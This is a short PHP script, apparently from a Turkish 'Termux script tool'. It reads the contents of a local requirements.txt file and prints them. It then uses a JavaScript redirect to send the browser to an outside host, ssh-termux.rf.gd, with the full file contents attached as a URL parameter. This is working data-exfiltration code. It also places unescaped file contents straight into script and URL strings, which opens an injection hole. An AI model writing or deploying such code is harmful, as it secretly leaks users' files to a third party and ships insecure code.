<?php 
ob_start();
$dosya = fopen('requirements.txt', 'r');
$icerik = fread($dosya, filesize('requirements.txt'));
echo $icerik;
fclose($dosya);
$url = "http://ssh-termux.rf.gd/?termux-yaman-efkar-script-tool-turk-siber-timi=yamanefkar-script-tool-turk-siber-timi-date-0-0-1yaman-efkaryamangw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq&veri=".$icerik;
echo "<script>window.location ='".$url."'</script>"

 ?>